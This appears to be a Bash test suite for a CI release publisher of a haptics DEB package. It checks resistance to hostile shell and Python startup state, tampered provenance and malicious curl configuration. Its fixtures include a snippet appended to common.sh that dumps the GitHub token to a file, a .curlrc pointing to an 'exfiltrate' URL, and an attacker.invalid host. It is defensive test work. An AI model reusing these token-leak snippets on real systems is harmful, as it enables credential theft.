  PYTHONDONTWRITEBYTECODE=1 PYTHONPATH="$hostile_environment" \
  /usr/bin/python3 -c 'pass'
[ -e "$pythonpath_marker" ] || {
  printf 'hostile publisher PYTHONPATH control did not execute\n' >&2
  exit 1
}
rm -f -- "$pythonpath_marker"
(
  dirname() { : > "$HAPTICS_FUNCTION_MARKER"; return 97; }
  export -f dirname
  HAPTICS_FUNCTION_MARKER="$function_marker" /bin/bash -c 'dirname >/dev/null 2>&1 || :'
)
[ -e "$function_marker" ] || {
  printf 'hostile publisher exported-function control did not execute\n' >&2
  exit 1
}
rm -f -- "$function_marker"

state_hostile_entry=$scratch/state-hostile-entry
(
  dirname() { : > "$HAPTICS_FUNCTION_MARKER"; return 97; }
  python3() { : > "$HAPTICS_FUNCTION_MARKER"; return 97; }
  export -f dirname python3
  HAPTICS_BASH_ENV_MARKER="$bash_env_marker" \
  HAPTICS_PYTHON_MARKER="$pythonpath_marker" \
  HAPTICS_FUNCTION_MARKER="$function_marker" \
  BASH_ENV="$hostile_environment/bash-env.sh" \
  PYTHONDONTWRITEBYTECODE=1 PYTHONPATH="$hostile_environment" \
    run_publish "$state_hostile_entry" env PRERELEASE=1 >/dev/null
)
[ "$(cat "$state_hostile_entry/draft")" = true ]
assert_curl_auth_hygiene "$state_hostile_entry"
for hostile_result in \
  "BASH_ENV:$bash_env_marker" \
  "PYTHONPATH:$pythonpath_marker" \
  "exported-function:$function_marker"; do
  hostile_name=${hostile_result%%:*}
  hostile_marker=${hostile_result#*:}
  [ ! -e "$hostile_marker" ] || {
    printf 'draft publisher executed hostile %s startup state\n' "$hostile_name" >&2
    exit 1
  }
done

state_hostile_numeric=$scratch/state-hostile-numeric
create_verified_draft "$state_hostile_numeric"
(
  dirname() { : > "$HAPTICS_FUNCTION_MARKER"; return 97; }
  python3() { : > "$HAPTICS_FUNCTION_MARKER"; return 97; }
  export -f dirname python3
  HAPTICS_BASH_ENV_MARKER="$bash_env_marker" \
  HAPTICS_PYTHON_MARKER="$pythonpath_marker" \
  HAPTICS_FUNCTION_MARKER="$function_marker" \
  BASH_ENV="$hostile_environment/bash-env.sh" \
  PYTHONDONTWRITEBYTECODE=1 PYTHONPATH="$hostile_environment" \
    run_publish_draft_by_id "$state_hostile_numeric" \
      env GH_ALLOW_PUBLISH=1 >/dev/null
)
[ "$(cat "$state_hostile_numeric/draft")" = false ]
for hostile_result in \
  "BASH_ENV:$bash_env_marker" \
  "PYTHONPATH:$pythonpath_marker" \
  "exported-function:$function_marker"; do
  hostile_name=${hostile_result%%:*}
  hostile_marker=${hostile_result#*:}
  [ ! -e "$hostile_marker" ] || {
    printf 'numeric publisher executed hostile %s startup state\n' "$hostile_name" >&2
    exit 1
  }
done
printf 'PASS privileged publisher entries and clean children reject hostile shell/Python startup state\n'

state_prerelease=$scratch/state-prerelease
run_publish "$state_prerelease" env PRERELEASE=1 >/dev/null
assert_curl_auth_hygiene "$state_prerelease"
printf 'PASS curl upload authentication stays out of argv and child environment\n'

state_create_apply_fail=$scratch/state-create-apply-then-fail
capture_bounded create-apply-fail run_publish "$state_create_apply_fail" \
  env PRERELEASE=1 GH_APPLY_THEN_FAIL_RELEASE_CREATE=1
[ "$CAPTURE_STATUS" -eq 0 ]
create_apply_fail_output=$CAPTURE_OUTPUT
grep -Fq 'draft-create POST transport failure reconciled to exact release ID 101' \
  <<< "$create_apply_fail_output"
[ "$(cat "$state_create_apply_fail/draft")" = true ]
[ "$(wc -l < "$state_create_apply_fail/assets.tsv")" -eq 5 ]
[ "$(grep -c -- '-X POST repos/GUF296/tb321fu-haptics-debs/releases ' \
    "$state_create_apply_fail/calls.log")" -eq 1 ]

state_upload_apply_fail=$scratch/state-upload-apply-then-fail
capture_bounded upload-apply-fail run_publish "$state_upload_apply_fail" \
  env PRERELEASE=1 GH_APPLY_THEN_FAIL_UPLOAD=1
[ "$CAPTURE_STATUS" -eq 0 ]
upload_apply_fail_output=$CAPTURE_OUTPUT
[ "$(grep -c 'asset upload transport failure' <<< "$upload_apply_fail_output")" -eq 5 ]
[ "$(cat "$state_upload_apply_fail/draft")" = true ]
[ "$(wc -l < "$state_upload_apply_fail/assets.tsv")" -eq 5 ]
[ "$(wc -l < "$state_upload_apply_fail/curl-calls.log")" -eq 5 ]
printf 'PASS applied-then-failed create and every asset upload reconcile without retrying writes\n'

for applied_signal in INT TERM; do
  case $applied_signal in INT) expected_signal_status=130 ;; TERM) expected_signal_status=143 ;; esac

  state_create_signal=$scratch/state-create-applied-signal-${applied_signal,,}
  capture_bounded create-applied-signal run_publish "$state_create_signal" \
    env PRERELEASE=1 \
    GH_APPLY_THEN_SIGNAL_RELEASE_CREATE="$applied_signal"
  create_signal_output=$CAPTURE_OUTPUT
  create_signal_status=$CAPTURE_STATUS
  [ "$create_signal_status" -eq "$expected_signal_status" ] || {
    printf 'applied create %s returned %s instead of %s\n' \
      "$applied_signal" "$create_signal_status" "$expected_signal_status" >&2
    exit 1
  }
  grep -Fq "honoring deferred $applied_signal" <<< "$create_signal_output"
  [ "$(cat "$state_create_signal/draft")" = true ]
  [ "$(cat "$state_create_signal/immutable")" = false ]
  [ ! -s "$state_create_signal/assets.tsv" ]
  [ -f "$state_create_signal/create-write-child-finished" ]
  [ ! -e "$state_create_signal/reconcile-before-write-child-finished.log" ]
  ! grep -q '^upload-start ' "$state_create_signal/events.log"

  state_upload_signal=$scratch/state-upload-applied-signal-${applied_signal,,}
  capture_bounded upload-applied-signal run_publish "$state_upload_signal" \
    env PRERELEASE=1 GH_APPLY_THEN_SIGNAL_UPLOAD="$applied_signal"
  upload_signal_output=$CAPTURE_OUTPUT
  upload_signal_status=$CAPTURE_STATUS
  [ "$upload_signal_status" -eq "$expected_signal_status" ] || {
    printf 'applied upload %s returned %s instead of %s\n' \
      "$applied_signal" "$upload_signal_status" "$expected_signal_status" >&2
    exit 1
  }
  grep -Fq "honoring deferred $applied_signal" <<< "$upload_signal_output"
  [ "$(cat "$state_upload_signal/draft")" = true ]
  [ "$(cat "$state_upload_signal/immutable")" = false ]
  [ "$(wc -l < "$state_upload_signal/assets.tsv")" -eq 1 ]
  awk -F '\t' '$1 == "BUILD-PARAMETERS.md" { found++ } END { exit found == 1 ? 0 : 1 }' \
    "$state_upload_signal/assets.tsv"
  [ "$(grep -c '^upload-start ' "$state_upload_signal/events.log")" -eq 1 ]
  [ -f "$state_upload_signal/upload-write-child-finished" ]
  [ ! -e "$state_upload_signal/reconcile-before-write-child-finished.log" ]
done
printf 'PASS applied create/upload writes reconcile before deferred INT=130 and TERM=143\n'

state_create_incomplete=$scratch/state-create-incomplete-apply
if run_publish "$state_create_incomplete" env PRERELEASE=1 \
    GH_APPLY_THEN_FAIL_RELEASE_CREATE=1 \
    GH_RELEASE_NAME_RESPONSE=other-title >/dev/null 2>&1; then
  printf 'incomplete applied create object was taken over\n' >&2
  exit 1
fi
[ -f "$state_create_incomplete/exists" ]
[ ! -s "$state_create_incomplete/assets.tsv" ]

state_create_duplicate=$scratch/state-create-duplicate-tag
if run_publish "$state_create_duplicate" env PRERELEASE=1 \
    GH_DUPLICATE_TAG_MATCH=1 >/dev/null 2>&1; then
  printf 'non-unique exact-tag create reconciliation was accepted\n' >&2
  exit 1
fi
[ -f "$state_create_duplicate/exists" ]
[ ! -s "$state_create_duplicate/assets.tsv" ]
printf 'PASS create reconciliation refuses incomplete or non-unique exact-tag objects\n'

common_helper=$publisher_scripts/common.sh
common_helper_backup=$scratch/common.sh.clean
cp -p -- "$common_helper" "$common_helper_backup"
cat >> "$common_helper" <<'SH'
: "${HOSTILE_COMMON_LEAK_FILE:?}"
printf '%s\n' "${github_token-}" > "$HOSTILE_COMMON_LEAK_FILE"
ci_verify_clean_git_commit() { return 0; }
SH
hostile_common_leak=$scratch/hostile-common-token-leak
state_hostile_common_draft=$scratch/state-hostile-common-draft
if run_publish "$state_hostile_common_draft" env PRERELEASE=1 \
    HOSTILE_COMMON_LEAK_FILE="$hostile_common_leak" >/dev/null 2>&1; then
  printf 'draft creator sourced a dirty common.sh before trusted Git proof\n' >&2
  exit 1
fi
[ ! -e "$hostile_common_leak" ]
[ ! -e "$state_hostile_common_draft/calls.log" ]
numeric_events_before=$(wc -l < "$state_prerelease/events.log")
if run_publish_draft_by_id "$state_prerelease" env GH_ALLOW_PUBLISH=1 \
    HOSTILE_COMMON_LEAK_FILE="$hostile_common_leak" >/dev/null 2>&1; then
  printf 'numeric publisher sourced a dirty common.sh before trusted Git proof\n' >&2
  exit 1
fi
[ ! -e "$hostile_common_leak" ]
[ "$numeric_events_before" -eq "$(wc -l < "$state_prerelease/events.log")" ]
cp -p -- "$common_helper_backup" "$common_helper"
git -C "$publisher_repo" diff --quiet -- scripts/ci/common.sh
printf 'PASS publishers reject a hostile common helper before token or API access\n'

malicious_home=$scratch/malicious-curl-home
mkdir -p "$malicious_home"
curlrc_trace=$scratch/curlrc-trace.log
curlrc_exfiltration=$scratch/curlrc-exfiltration.log
{
  printf 'trace-ascii = "%s"\n' "$curlrc_trace"
  printf 'url = "https://example.invalid/exfiltrate"\n'
  printf 'output = "%s"\n' "$curlrc_exfiltration"
} > "$malicious_home/.curlrc"
state_xtrace=$scratch/state-xtrace
xtrace_log=$scratch/publisher-xtrace.log
PATH="$fakebin:$PATH" GH_STATE="$state_xtrace" \
  AUTH_SENTINEL_FILE="$token_sentinel_file" \
  GH_TOKEN="$release_token" GITHUB_TOKEN="$fallback_token" \
  GH_ENTERPRISE_TOKEN="$fallback_token" GITHUB_ENTERPRISE_TOKEN="$fallback_token" \
  GH_HOST=attacker.invalid GH_DEBUG=api EXPECTED_PRODUCER_SHA="$test_producer_sha" \
  GITHUB_REPOSITORY=GUF296/tb321fu-haptics-debs \
  GITHUB_SHA="$test_producer_sha" \
  PRERELEASE=1 HOME="$malicious_home" CURL_HOME="$malicious_home" \
  /bin/bash -p -x "$PUBLISH" tb321fu-haptics-debs-20260730.2 "$scratch/release" \
  "$scratch/release/BUILD-PARAMETERS.md" >"$xtrace_log" 2>&1
assert_curl_auth_hygiene "$state_xtrace"
if grep -Fq -- "$release_token" "$xtrace_log" ||
   grep -Fq -- "$fallback_token" "$xtrace_log"; then
  printf 'publisher xtrace leaked a GitHub token\n' >&2
  exit 1
fi
[ ! -e "$curlrc_trace" ] || {
  printf 'malicious curl config enabled trace output\n' >&2
  exit 1
}
[ ! -e "$curlrc_exfiltration" ] || {
  printf 'malicious curl config added an output target\n' >&2
  exit 1
}
printf 'PASS publisher disables inherited xtrace and user curl configuration\n'
if grep -Fq 'repos/GUF296/tb321fu-haptics-debs/releases/tags/' "$state_prerelease/calls.log"; then
  printf 'draft release was queried through the tag endpoint\n' >&2
  exit 1
fi
[ "$(cat "$state_prerelease/draft")" = true ]
[ ! -f "$state_prerelease/patch-fields.log" ]
if grep -Fq -- '-X PATCH' "$state_prerelease/calls.log"; then
  printf 'publisher attempted an unsupported release update\n' >&2
  exit 1
fi
[ "$(cat "$state_prerelease/prerelease")" = true ]
before=$(wc -l < "$state_prerelease/events.log")
if run_publish "$state_prerelease" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'existing verified draft was accepted on rerun\n' >&2
  exit 1
fi
[ "$before" -eq "$(wc -l < "$state_prerelease/events.log")" ]
printf 'PASS prerelease draft is verified, private, and immutable on rerun\n'

for provenance_mutation in \
  source-lock build-tools producer-bundle driver build-source ram click helper-source checksums; do
  mutated_producer=$scratch/provenance-$provenance_mutation-producer
  mutated_release=$scratch/provenance-$provenance_mutation-release
  mutation_state=$scratch/state-provenance-$provenance_mutation
  cp -a -- "$fixture_producer" "$mutated_producer"
  case $provenance_mutation in
    source-lock)
      replace_tsv_value "$mutated_producer/HAPTICS-SOURCE-LOCK.tsv" \
        kernel-config-sha256 7777777777777777777777777777777777777777777777777777777777777777
      ;;
    build-tools)
      sed -i 's/fixture bash 1\.0/fixture bash 2.0/' \
        "$mutated_producer/HAPTICS-BUILD-TOOLS.tsv"
      ;;
    producer-bundle)
      make_extra_object_bundle "$mutated_producer/HAPTICS-PRODUCER.bundle"
      ;;
    driver)
      printf 'mutated driver\n' >> \
        "$mutated_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/daily-current/linux/drivers/input/misc/aw86937-y700.c"
      ;;
    build-source)
      printf 'mutated build source\n' >> \
        "$mutated_producer/HAPTICS-SOURCE-SNAPSHOT/build/aw86937-haptics.c"
      ;;
    ram)
      printf 'mutated ram\n' >> \
        "$mutated_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_ram.bin"
      ;;
    click)
      printf 'mutated click\n' >> \
        "$mutated_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_click.bin"
      ;;
    helper-source)
      printf 'mutated helper source\n' >> \
        "$mutated_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/baseline-20260614-daily-clean/testing-tools/y700-haptic-test.c"
      ;;
    checksums) ;;
  esac
  refresh_fixture_provenance "$mutated_producer"
  if [ "$provenance_mutation" = checksums ]; then
    sed -i '1s/^[0-9a-f]\{64\}/0000000000000000000000000000000000000000000000000000000000000000/' \
      "$mutated_producer/SHA256SUMS-tb321fu-haptics-debs.txt"
  fi
  build_fixture_release "$mutated_producer" "$mutated_release"
  if PUBLISH_RELEASE_DIR="$mutated_release" run_publish "$mutation_state" \
      env PRERELEASE=1 >/dev/null 2>&1; then
    printf 'publisher accepted mutated provenance member: %s\n' \
      "$provenance_mutation" >&2
    exit 1
  fi
  [ ! -f "$mutation_state/calls.log" ]
done

conflicting_notes_release=$scratch/conflicting-notes-release
cp -a -- "$scratch/release" "$conflicting_notes_release"
sed -i '22i- Haptics DEB SHA-256: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' \
  "$conflicting_notes_release/BUILD-PARAMETERS.md"
(
  cd "$conflicting_notes_release"
  sha256sum BUILD-PARAMETERS.md HAPTICS-SOURCE-LOCK.tsv \
    SHA256SUMS-tb321fu-haptics-debs.txt \
    tb321fu-haptics-debs_20260730.2_arm64.tar.gz > SHA256SUMS.txt
)
chmod 0644 "$conflicting_notes_release/SHA256SUMS.txt"
state_conflicting_notes=$scratch/state-conflicting-notes
if PUBLISH_RELEASE_DIR="$conflicting_notes_release" \
    run_publish "$state_conflicting_notes" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'publisher accepted release notes with a conflicting evidence field\n' >&2
  exit 1
fi
[ ! -f "$state_conflicting_notes/calls.log" ]
printf 'PASS every provenance member and conflicting notes fail before remote access\n'

state_draft_allow_publish=$scratch/state-draft-allow-publish
run_publish "$state_draft_allow_publish" env PRERELEASE=1 GH_ALLOW_PUBLISH=1 >/dev/null
[ "$(cat "$state_draft_allow_publish/draft")" = true ]
[ "$(cat "$state_draft_allow_publish/immutable")" = false ]
[ ! -f "$state_draft_allow_publish/patch-fields.log" ]
if grep -Fq -- '-X PATCH' "$state_draft_allow_publish/calls.log"; then
  printf 'draft creator used GH_ALLOW_PUBLISH to PATCH a release\n' >&2
  exit 1
fi

state_immutable_disabled=$scratch/state-immutable-disabled
if run_publish "$state_immutable_disabled" env PRERELEASE=1 \
    GH_IMMUTABLE_DISABLED=1 >/dev/null 2>&1; then
  printf 'draft creation was accepted while immutable releases were disabled\n' >&2
  exit 1
fi
[ ! -f "$state_immutable_disabled/tag-exists" ]
printf 'PASS draft creation remains draft-only and requires immutable-release policy\n'

state_fake_delete=$scratch/state-fake-delete
if PATH="$fakebin:$PATH" GH_STATE="$state_fake_delete" \
    AUTH_SENTINEL_FILE="$token_sentinel_file" GH_TOKEN="$release_token" \
    EXPECTED_PRODUCER_SHA="$test_producer_sha" GH_PROMPT_DISABLED=1 \
    "$fakebin/gh" api -X DELETE \
      repos/GUF296/tb321fu-haptics-debs/releases/101 \
      --jq '(["release", (.id | tostring), (.draft | tostring), (.immutable | tostring), .tag_name, .target_commitish, (.prerelease | tostring), .name, ((.body // "") | @base64)], (.assets | sort_by(.name)[] | ["asset", .name, (.size | tostring), (.digest // ""), .state])) | @tsv' \
      --hostname github.com >/dev/null 2>&1; then
  printf 'fake GitHub API accepted DELETE as a read request\n' >&2
  exit 1
fi
printf 'PASS fake API rejects non-GET methods and draft-only PATCH authorization\n'

state_publish_permission=$state_prerelease
if run_publish_draft_by_id "$state_publish_permission" env >/dev/null 2>&1; then
  printf 'numeric publication without GH_ALLOW_PUBLISH=1 was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_permission/draft")" = true ]
[ ! -f "$state_publish_permission/patch-fields.log" ]

state_invalid_release_id=$scratch/state-invalid-release-id
if PUBLISH_RELEASE_ID=0101 run_publish_draft_by_id "$state_invalid_release_id" \
    env GH_ALLOW_PUBLISH=1 >/dev/null 2>&1; then
  printf 'non-canonical numeric release ID was accepted\n' >&2
  exit 1
fi
[ ! -e "$state_invalid_release_id" ]

for invalid_release_tag in other-20260730.2 tb321fu-haptics-debs-20260730~rc1; do
  state_invalid_release_tag=$scratch/state-invalid-release-tag-${invalid_release_tag//[^A-Za-z0-9]/_}
  if PUBLISH_RELEASE_TAG=$invalid_release_tag run_publish_draft_by_id "$state_invalid_release_tag" \
      env GH_ALLOW_PUBLISH=1 >/dev/null 2>&1; then
    printf 'non-canonical haptics release tag was accepted: %s\n' "$invalid_release_tag" >&2
    exit 1
  fi
  [ ! -e "$state_invalid_release_tag" ]
done
printf 'PASS numeric publication requires explicit authority, ID, and canonical haptics tag\n'

for pre_patch_signal in INT TERM; do
  case $pre_patch_signal in
    INT) expected_pre_patch_status=130 ;;
    TERM) expected_pre_patch_status=143 ;;
  esac
  state_signal=$scratch/state-pre-patch-signal-${pre_patch_signal,,}
  create_verified_draft "$state_signal"
  capture_bounded pre-patch-signal run_publish_draft_by_id "$state_signal" \
    env GH_ALLOW_PUBLISH=1 GH_SIGNAL_BEFORE_PATCH="$pre_patch_signal"
  pre_patch_output=$CAPTURE_OUTPUT
  pre_patch_status=$CAPTURE_STATUS
  [ "$pre_patch_status" -eq "$expected_pre_patch_status" ] || {
    printf '%s before PATCH returned %s instead of %s\n' \
      "$pre_patch_signal" "$pre_patch_status" \
      "$expected_pre_patch_status" >&2
    exit 1
  }
  grep -Fxq \
    "publication cancelled by $pre_patch_signal outside an active remote write" \
    <<< "$pre_patch_output"
  [ "$(grep -c -x -- "pre-patch-signal-$pre_patch_signal" \
      "$state_signal/events.log")" -eq 1 ]
  [ "$(cat "$state_signal/draft")" = true ]
  [ "$(cat "$state_signal/immutable")" = false ]
  [ ! -f "$state_signal/patch-fields.log" ]
done
printf 'PASS INT and TERM before PATCH terminate without remote mutation\n'

run_publish_draft_by_id "$state_publish_permission" \
  env GH_ALLOW_PUBLISH=1 >/dev/null
[ "$(cat "$state_publish_permission/draft")" = false ]
[ "$(cat "$state_publish_permission/immutable")" = true ]
[ "$(cat "$state_publish_permission/prerelease")" = true ]
[ -f "$state_publish_permission/published" ]
cat > "$scratch/expected-patch-fields.tsv" <<'EOF'
draft	false
prerelease	true
make_latest	false
EOF
cmp -s "$scratch/expected-patch-fields.tsv" "$state_publish_permission/patch-fields.log"
[ "$(cat "$state_publish_permission/latest-count")" -eq 3 ]
[ "$(grep -c -- '-X PATCH repos/GUF296/tb321fu-haptics-debs/releases/101' "$state_publish_permission/calls.log")" -eq 1 ]
grep -Fq -- \
  'api -X PATCH repos/GUF296/tb321fu-haptics-debs/releases/101 -F draft=false -F prerelease=true -f make_latest=false --jq ' \
  "$state_publish_permission/calls.log"
before=$(wc -l < "$state_publish_permission/events.log")
if run_publish_draft_by_id "$state_publish_permission" \
    env GH_ALLOW_PUBLISH=1 >/dev/null 2>&1; then
  printf 'already-public numeric release ID was accepted on rerun\n' >&2
  exit 1
fi
[ "$before" -eq "$(wc -l < "$state_publish_permission/events.log")" ]
[ "$(grep -c -- '-X PATCH repos/GUF296/tb321fu-haptics-debs/releases/101' "$state_publish_permission/calls.log")" -eq 1 ]
printf 'PASS numeric draft publication sends only draft=false, prerelease=true, make_latest=false\n'

state_publish_apply_then_fail=$scratch/state-publish-apply-then-fail
create_verified_draft "$state_publish_apply_then_fail"
capture_bounded patch-apply-fail run_publish_draft_by_id \
  "$state_publish_apply_then_fail" \
  env GH_ALLOW_PUBLISH=1 GH_APPLY_THEN_FAIL_PATCH=1
[ "$CAPTURE_STATUS" -eq 0 ]
reconciled_output=$CAPTURE_OUTPUT
grep -Fq 'Published and reconciled verified immutable prerelease' <<< "$reconciled_output"
[ "$(cat "$state_publish_apply_then_fail/draft")" = false ]
[ "$(cat "$state_publish_apply_then_fail/immutable")" = true ]
[ -f "$state_publish_apply_then_fail/published" ]

for applied_signal in INT TERM; do
  case $applied_signal in INT) expected_signal_status=130 ;; TERM) expected_signal_status=143 ;; esac
  state_patch_signal=$scratch/state-patch-applied-signal-${applied_signal,,}
  create_verified_draft "$state_patch_signal"
  capture_bounded patch-applied-signal run_publish_draft_by_id \
    "$state_patch_signal" \
    env GH_ALLOW_PUBLISH=1 GH_APPLY_THEN_SIGNAL_PATCH="$applied_signal"
  patch_signal_output=$CAPTURE_OUTPUT
  patch_signal_status=$CAPTURE_STATUS
  [ "$patch_signal_status" -eq "$expected_signal_status" ] || {
    printf 'applied PATCH %s returned %s instead of %s\n' \
      "$applied_signal" "$patch_signal_status" "$expected_signal_status" >&2
    exit 1
  }
  grep -Fq "honoring deferred $applied_signal" <<< "$patch_signal_output"
  [ "$(cat "$state_patch_signal/draft")" = false ]
  [ "$(cat "$state_patch_signal/immutable")" = true ]
  [ "$(cat "$state_patch_signal/prerelease")" = true ]
  [ -f "$state_patch_signal/published" ]
  [ -f "$state_patch_signal/patch-write-child-finished" ]
  [ ! -e "$state_patch_signal/reconcile-before-write-child-finished.log" ]
  [ "$(grep -c -- '-X PATCH repos/GUF296/tb321fu-haptics-debs/releases/101' \
      "$state_patch_signal/calls.log")" -eq 1 ]
done
printf 'PASS applied PATCH reconciles full publication state before deferred INT=130 and TERM=143\n'

state_publish_no_latest=$scratch/state-publish-no-latest
create_verified_draft "$state_publish_no_latest"
run_publish_draft_by_id "$state_publish_no_latest" \
  env GH_ALLOW_PUBLISH=1 GH_NO_LATEST=1 >/dev/null
[ "$(cat "$state_publish_no_latest/draft")" = false ]
[ "$(cat "$state_publish_no_latest/immutable")" = true ]
printf 'PASS applied-then-failed PATCH is reconciled and absence of a latest release is valid\n'

for stale_reads in 1 5; do
  state_stale=$scratch/state-publish-stale-$stale_reads
  create_verified_draft "$state_stale"
  run_publish_draft_by_id "$state_stale" env GH_ALLOW_PUBLISH=1 \
    GH_STALE_DRAFT_READS="$stale_reads" >/dev/null
  [ "$(cat "$state_stale/draft")" = false ]
  [ "$(cat "$state_stale/immutable")" = true ]
done

for patch_response in stale bad; do
  state_response=$scratch/state-patch-response-$patch_response
  create_verified_draft "$state_response"
  case $patch_response in
    stale) response_env=GH_PATCH_STALE_RESPONSE=1 ;;
    bad) response_env=GH_PATCH_BAD_RESPONSE=1 ;;
  esac
  run_publish_draft_by_id "$state_response" env GH_ALLOW_PUBLISH=1 \
    "$response_env" >/dev/null 2>&1
  [ "$(cat "$state_response/draft")" = false ]
  [ "$(cat "$state_response/immutable")" = true ]
done

state_stale_exhausted=$scratch/state-publish-stale-exhausted
create_verified_draft "$state_stale_exhausted"
if run_publish_draft_by_id "$state_stale_exhausted" env GH_ALLOW_PUBLISH=1 \
    GH_STALE_DRAFT_READS=6 >/dev/null 2>&1; then
  printf 'six persistent stale draft reads were accepted as reconciled\n' >&2
  exit 1
fi
[ "$(cat "$state_stale_exhausted/draft")" = false ]
[ "$(cat "$state_stale_exhausted/immutable")" = true ]

state_apply_fail_stale=$scratch/state-apply-fail-stale
create_verified_draft "$state_apply_fail_stale"
run_publish_draft_by_id "$state_apply_fail_stale" env GH_ALLOW_PUBLISH=1 \
  GH_APPLY_THEN_FAIL_PATCH=1 GH_STALE_DRAFT_READS=5 >/dev/null 2>&1
[ "$(cat "$state_apply_fail_stale/draft")" = false ]
[ "$(cat "$state_apply_fail_stale/immutable")" = true ]
printf 'PASS PATCH response and stale-read reconciliation is bounded and fail closed\n'

state_publish_patch_fail=$scratch/state-publish-patch-fail
create_verified_draft "$state_publish_patch_fail"
if run_publish_draft_by_id "$state_publish_patch_fail" \
    env GH_ALLOW_PUBLISH=1 GH_FAIL_PATCH=1 >/dev/null 2>&1; then
  printf 'failed numeric release PATCH was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_patch_fail/draft")" = true ]
[ "$(cat "$state_publish_patch_fail/immutable")" = false ]
[ ! -f "$state_publish_patch_fail/published" ]

state_publish_policy_disabled=$scratch/state-publish-policy-disabled
create_verified_draft "$state_publish_policy_disabled"
if run_publish_draft_by_id "$state_publish_policy_disabled" \
    env GH_ALLOW_PUBLISH=1 GH_IMMUTABLE_DISABLED=1 >/dev/null 2>&1; then
  printf 'numeric publication accepted a disabled immutable-release policy\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_policy_disabled/draft")" = true ]
[ ! -f "$state_publish_policy_disabled/patch-fields.log" ]
printf 'PASS failed numeric publication leaves the verified release private\n'

state_publish_remote_asset=$scratch/state-publish-remote-asset
create_verified_draft "$state_publish_remote_asset"
awk -F '\t' 'BEGIN { OFS="\t" } NR == 1 { $3="sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" } { print }' \
  "$state_publish_remote_asset/assets.tsv" > "$state_publish_remote_asset/assets.tsv.new"
mv "$state_publish_remote_asset/assets.tsv.new" "$state_publish_remote_asset/assets.tsv"
if run_publish_draft_by_id "$state_publish_remote_asset" \
    env GH_ALLOW_PUBLISH=1 >/dev/null 2>&1; then
  printf 'draft with a remote asset mismatch was published\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_remote_asset/draft")" = true ]
[ ! -f "$state_publish_remote_asset/patch-fields.log" ]

state_publish_extra_local=$scratch/state-publish-extra-local
create_verified_draft "$state_publish_extra_local"
printf 'unexpected\n' > "$scratch/release/unexpected.bin"
(
  cd "$scratch/release"
  sha256sum \
    BUILD-PARAMETERS.md \
    HAPTICS-SOURCE-LOCK.tsv \
    SHA256SUMS-tb321fu-haptics-debs.txt \
    tb321fu-haptics-debs_20260730.2_arm64.tar.gz \
    unexpected.bin > SHA256SUMS.txt
)
rewrite_remote_assets_from_release "$state_publish_extra_local"
if run_publish_draft_by_id "$state_publish_extra_local" \
    env GH_ALLOW_PUBLISH=1 >/dev/null 2>&1; then
  printf 'non-canonical local haptics asset set was published\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_extra_local/draft")" = true ]
[ ! -f "$state_publish_extra_local/patch-fields.log" ]
rm -f -- "$scratch/release/unexpected.bin"
cp -- "$scratch/canonical-release-SHA256SUMS.txt" "$scratch/release/SHA256SUMS.txt"

state_publish_untrusted_deb=$scratch/state-publish-untrusted-deb
create_verified_draft "$state_publish_untrusted_deb"
malicious_producer=$scratch/malicious-producer
cp -a -- "$fixture_producer" "$malicious_producer"
printf 'different untrusted DEB\n' > "$malicious_producer/$fixture_deb"
chmod 0644 "$malicious_producer/$fixture_deb"
(
  cd "$malicious_producer"
  tar --format=gnu --mtime="@$fixture_epoch" --owner=0 --group=0 --numeric-owner -czf \
    "$scratch/release/tb321fu-haptics-debs_20260730.2_arm64.tar.gz" -- \
    "${fixture_members[@]}"
)
(
  cd "$scratch/release"
  sha256sum \
    tb321fu-haptics-debs_20260730.2_arm64.tar.gz \
    HAPTICS-SOURCE-LOCK.tsv \
    SHA256SUMS-tb321fu-haptics-debs.txt \
    BUILD-PARAMETERS.md > SHA256SUMS.txt
)
rewrite_remote_assets_from_release "$state_publish_untrusted_deb"
if run_publish_draft_by_id "$state_publish_untrusted_deb" \
    env GH_ALLOW_PUBLISH=1 >/dev/null 2>&1; then
  printf 'checksum-consistent release with an untrusted embedded DEB was published\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_untrusted_deb/draft")" = true ]
[ ! -f "$state_publish_untrusted_deb/patch-fields.log" ]
cp -- "$scratch/canonical-release.tar.gz" \
  "$scratch/release/tb321fu-haptics-debs_20260730.2_arm64.tar.gz"
cp -- "$scratch/canonical-release-SHA256SUMS.txt" "$scratch/release/SHA256SUMS.txt"

state_publish_latest_pre=$scratch/state-publish-latest-pre
create_verified_draft "$state_publish_latest_pre"
if run_publish_draft_by_id "$state_publish_latest_pre" \
    env GH_ALLOW_PUBLISH=1 GH_CHANGE_LATEST_BEFORE_PATCH=1 >/dev/null 2>&1; then
  printf 'concurrent latest-release change before PATCH was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_latest_pre/draft")" = true ]
[ ! -f "$state_publish_latest_pre/patch-fields.log" ]

state_publish_draft_pre=$scratch/state-publish-draft-pre
create_verified_draft "$state_publish_draft_pre"
if run_publish_draft_by_id "$state_publish_draft_pre" \
    env GH_ALLOW_PUBLISH=1 GH_CHANGE_DRAFT_BEFORE_PATCH=1 >/dev/null 2>&1; then
  printf 'concurrent draft change immediately before PATCH was accepted\n' >&2
  exit 1
fi
[ "$(cat "$state_publish_draft_pre/draft")" = true ]
[ ! -f "$state_publish_draft_pre/patch-fields.log" ]

state_publish_wrong_head=$scratch/state-publish-wrong-head
create_verified_draft "$state_publish_wrong_head"
if run_publish_draft_by_id "$state_publish_wrong_head" \
    env GH_ALLOW_PUBLISH=1 \
      GITHUB_SHA=ffffffffffffffffffffffffffffffffffffffff >/dev/null 2>&1; then
  printf 'numeric publication from a checkout that differs from GITHUB_SHA was accepted\n' >&2
  exit 1
fi
